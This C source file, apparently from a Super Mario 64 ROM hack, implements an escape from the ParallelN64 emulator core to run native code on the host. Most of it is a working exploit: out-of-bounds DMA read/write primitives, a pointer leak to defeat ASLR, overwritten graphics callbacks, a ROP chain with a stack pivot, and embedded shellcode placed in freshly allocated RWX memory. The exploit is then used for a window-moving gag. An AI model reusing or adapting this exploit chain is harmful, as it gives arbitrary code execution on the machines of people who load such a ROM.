#include <ultra64.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include "buffers/framebuffers.h"
#include "engine/math_util.h"
#include "game/camera.h"
#include "game/hypercall.h"
#include "game/main.h"
#include "game/printf.h"
#include "libpl/libpl.h"

void wait_for_dma() {
    register u32 stat;
    stat = IO_READ(PI_STATUS_REG);
    while (stat & (PI_STATUS_IO_BUSY | PI_STATUS_DMA_BUSY))
        stat = IO_READ(PI_STATUS_REG);
}

void oob_read(u32 offset, void* dst, u32 len) {
    // Copy from OOB memory to SRAM
    wait_for_dma();
    IO_WRITE(PI_DRAM_ADDR_REG, 0x800000 + offset);
    IO_WRITE(PI_CART_ADDR_REG, 0x8000000);
    IO_WRITE(PI_RD_LEN_REG, len - 1);

    // Copy from SRAM to memory
    wait_for_dma();
    IO_WRITE(PI_DRAM_ADDR_REG, osVirtualToPhysical(dst));
    IO_WRITE(PI_CART_ADDR_REG, 0x8000000);
    IO_WRITE(PI_WR_LEN_REG, len - 1);
    wait_for_dma();
}

u64 oob_read_u64(u32 offset) {
    u64 ret;
    oob_read(offset, &ret, sizeof(ret));
    return (ret >> 32) | (ret << 32);
}

void oob_write(u32 offset, void* src, u32 len) {
    // Copy from memory to SRAM
    wait_for_dma();
    IO_WRITE(PI_DRAM_ADDR_REG, osVirtualToPhysical(src));
    IO_WRITE(PI_CART_ADDR_REG, 0x8000000);
    IO_WRITE(PI_RD_LEN_REG, len - 1);

    // Copy from SRAM to OOB memory
    wait_for_dma();
    IO_WRITE(PI_DRAM_ADDR_REG, 0x800000 + offset);
    IO_WRITE(PI_CART_ADDR_REG, 0x8000000);
    IO_WRITE(PI_WR_LEN_REG, len - 1);
    wait_for_dma();
}

void oob_write_u64(u32 offset, u64 val) {
    val = (val >> 32) | (val << 32);
    oob_write(offset, &val, sizeof(val));
}

// I'm lazy, so I'm reusing the crash screen code here
extern struct {
    OSThread thread;
    u64 stack[0x800 / sizeof(u64)];
    OSMesgQueue mesgQueue;
    OSMesg mesg;
    u16 *framebuffer;
    u16 width;
    u16 height;
} gCrashScreen;
extern void crash_screen_print(s32 x, s32 y, const char *fmt, ...);
extern u16 sRenderedFramebuffer;
static char gPrintBuf[1024];
static char *write_to_buf(char *buffer, const char *data, size_t size) {
    return (char *) memcpy(buffer, data, size) + size;
}
void panic(char* format, ...) {
    // Yep, double varargs
    // Don't feel like making a crash_screen_vprint
    va_list args;
    va_start(args, format);
    _Printf(write_to_buf, gPrintBuf, format, args);
    va_end(args);

    gCrashScreen.framebuffer = (u16*)gFramebuffers[sRenderedFramebuffer];
    crash_screen_print(10, 10, "%s", gPrintBuf);
    osWritebackDCacheAll();
    osViBlack(FALSE);
    osViSwapBuffer(gCrashScreen.framebuffer);
    while (TRUE);
}

#define CORE_VERSION_MAJOR 2
#define CORE_VERSION_MINOR 14
#define CORE_VERSION_PATCH 3
#define CVM_STRINGIFY(x) #x
#define CVM_VERSION_STRING(x,y,z) CVM_STRINGIFY(x) "." CVM_STRINGIFY(y) "." CVM_STRINGIFY(z)
#define CORE_VERSION_STRING CVM_VERSION_STRING(CORE_VERSION_MAJOR, CORE_VERSION_MINOR, CORE_VERSION_PATCH)

// RVA is relative to parallel_n64_next_libretro.dll's base
// OFFSET is relative to the end of the RDRAM array
#define READ_NOMEM_RVA 0x2313E0
#define STUB_RVA 0x6558
#define RDRAM_RVA 0x61F4000
#define PIVOT_RVA 0x3DED5
#define GADGET1_RVA 0x492B08
#define GADGET2_RVA 0x526D3
#define GADGET3_RVA 0x3E91
#define GADGET4_RVA 0x52F4
#define GADGET5_RVA 0x254F00
#define GADGET6_RVA 0x1138

#define READMEMD_OFFSET 0x80
#define VIRTUALFREE_OFFSET 0x8527858
#define GFX_OFFSET 0x4001E0
#define ROP_OFFSET 0x410208

#define MESG_VI_VBLANK 102
static u64 gRopChain[0x8000 / 8];
static u8 gShellcode[] = {
#include "src/native/shellcode_swap.inc.c"
};
u64 gShellcodeBase = 0;
void emulator_escape_init() {
    // Make sure we're running on Parallel Launcher's ParallelN64 core
    const lpl_version* coreVer = NULL;
    if (!libpl_is_supported(LPL_ABI_VERSION_CURRENT) || (coreVer = libpl_get_core_version()) == NULL)
        panic("This hack requires Parallel Launcher");
    
    // Also make sure this is the right build of ParallelN64
    // Unfortunately, this doesn't let us check what OS the player is using
    // This also can't verify if the version of RetroArch is correct (1.16.0)
    if (coreVer->major != CORE_VERSION_MAJOR || coreVer->minor != CORE_VERSION_MINOR || coreVer->patch != CORE_VERSION_PATCH)
        panic("Unsupported ParallelN64 core version\n"
              "Expected "CORE_VERSION_STRING" but got %hu.%hu.%hu", coreVer->major, coreVer->minor, coreVer->patch);

    // Leak a pointer from "readmemd" (m64p_memory.c) to find parallel_n64_next_libretro.dll's base
    u64 base = oob_read_u64(READMEMD_OFFSET) - READ_NOMEM_RVA;
    if (base & 0xFFF)
        panic("Bad leak pointer: %016llx", base);

    // Temporarily stub VirtualFree to prevent a crash later
    u64 virtualFree = oob_read_u64(VIRTUALFREE_OFFSET);
    oob_write_u64(VIRTUALFREE_OFFSET, base + STUB_RVA);

    // The stack pivot also lets us set rbx, which will be set to point to some shellcode
    // (this overwrites gfx.processDList)
    oob_write_u64(GFX_OFFSET + 0x20, base + RDRAM_RVA + osVirtualToPhysical(gShellcode));

    // Call ret 0xFFF0 to make some more space for the ROP chain
    // This places the stack in the middle of "blocks" (cached_interp.c)
    // (this overwrites gfx.processRDPList)
    oob_write_u64(GFX_OFFSET + 0x28, base + GADGET1_RVA);

    // Stub gfx.romClosed so the "ret 0xFFF0" doesn't explode
    oob_write_u64(GFX_OFFSET + 0x30, base + STUB_RVA);

    // The fun begins!
    u32 ropWriteHead = 0;

    // mov rax, rdx; ret
    gRopChain[ropWriteHead++] = base + GADGET2_RVA;

    // mov rcx, rbx; call qword ptr [rax + 8]
    gRopChain[ropWriteHead++] = base + GADGET3_RVA;

    // Place something to shift rsp at [rax + 8] so it doesn't start running random code
    // add rsp, 0x18; ret
    oob_write_u64(GFX_OFFSET + 0x1CC, base + GADGET4_RVA);

    // Padding
    gRopChain[ropWriteHead++] = 0x1234123412341234;
    gRopChain[ropWriteHead++] = 0x1234123412341234;

    // Call a helper function that allocates RWX memory and copies a given buffer into it
    // rdx (copy size) is still a pointer into parallel_n64_next_libretro.dll and r8 (alloc size) is a pointer into retroarch.exe
    // The function will clamp the copy size to the allocation size and retroarch.exe has no ASLR,
    // so by pure chance, this ends up allocating a reasonable amount of memory (0x8967CA bytes or ~9MB, not accounting for page alignment)
    gRopChain[ropWriteHead++] = base + GADGET5_RVA;

    // call rax
    gRopChain[ropWriteHead++] = base + GADGET6_RVA;

    // Swap words and write the final ROP chain
    for (u32 i = 0; i < ropWriteHead; i++)
        gRopChain[i] = (gRopChain[i] >> 32) | (gRopChain[i] << 32);
    oob_write(ROP_OFFSET, gRopChain, ropWriteHead * 8);

    // Overwrite gfx.updateScreen to make it point rsp to the gfx struct
    // This should be done last in case a vblank interrupt happens in the middle of exploit setup
    oob_write_u64(GFX_OFFSET + 0x48, base + PIVOT_RVA);

    // Wait for a few vblank interrupts to happen just to make sure the exploit ran
    // TODO: Shellcode should signal that it ran correctly somehow (other than via hypercall, which would crash the game if the exploit failed)
    u32 count = 0;
    while (TRUE) {
        OSMesg msg;
        osRecvMesg(&gIntrMesgQueue, &msg, OS_MESG_BLOCK);
        if ((uintptr_t)msg == MESG_VI_VBLANK && count++ == 15) {
            // Unstub VirtualFree
            oob_write_u64(VIRTUALFREE_OFFSET, virtualFree);
            gShellcodeBase = hypercall(HC_SHELLCODE_BASE, 0, 0, 0);
            break;
        }
    }
}

extern struct PlayerCameraState *sMarioCamState;
extern struct LakituState gLakituState;
extern Mat4 gMatStack[32];
Bool8 gFunnyZoom = FALSE;
float gMarioScreenX = 0.0f;
float gMarioScreenY = 0.0f;
float gMarioScreenClampX = 0.0f;
float gMarioScreenClampY = 0.0f;
u16 gOrigWinX = 0;
u16 gOrigWinY = 0;
void emulator_escape_post_update() {
    if (gFunnyZoom) {
        Mat4 view;
        Mat4 proj;
        Mat4 mvp;
        Vec3f clip;
        Vec3f world;
        world[0] = sMarioCamState->pos[0];
        world[1] = sMarioCamState->pos[1] + 80;
        world[2] = sMarioCamState->pos[2];
        mtxf_lookat(view, gLakituState.pos, gLakituState.focus, gLakituState.roll);
        guPerspectiveF(proj, NULL, 45.0f, 4.0f / 3.0f, 100.0f / 2.0f, 30000.0f / 2.0f, 1.0f);
        mtxf_mul_slow(mvp, view, proj); // Bottom row of perspective matrix isn't [0, 0, 0, 1], so need to use a fallback
        mtxf_mul_vec3_slow(clip, world, mvp);

        gMarioScreenX = (clip[0] + 1.0f) * 0.5f * 320.0f;
        gMarioScreenY = (1.0f - clip[1]) * 0.5f * 240.0f;
        gMarioScreenClampX = CLAMP(gMarioScreenX, 320.0f / 4.0f, (1280.0f - 320.0f) / 4.0f);
        gMarioScreenClampY = CLAMP(gMarioScreenY, 240.0f / 4.0f, (960.0f - 240.0f) / 4.0f);
    }
}

void emulator_escape_post_render() {
    if (gFunnyZoom) {
        u32 handle = hypercall(HC_GET_WINDOW, 0, 0, 0);
        u32 x = gMarioScreenClampX * 4.0f - 320.0f + gOrigWinX;
        u32 y = gMarioScreenClampY * 4.0f - 240.0f + gOrigWinY;
        hypercall(HC_SET_POS, handle, (x << 16) | y, (640 << 16) | 480);
    }
}

void emulator_escape_toggle_funny_zoom() {
    gFunnyZoom = !gFunnyZoom;
    if (gFunnyZoom) {
        u64 pos = hypercall(HC_GET_POS, hypercall(HC_GET_WINDOW, 0, 0, 0), 0, 0);
        gOrigWinX = pos >> 32;
        gOrigWinY = pos;
    } else {
        u32 handle = hypercall(HC_GET_WINDOW, 0, 0, 0);
        hypercall(HC_SET_POS, handle, (gOrigWinX << 16) | gOrigWinY, (1280 << 16) | 960);
    }
}
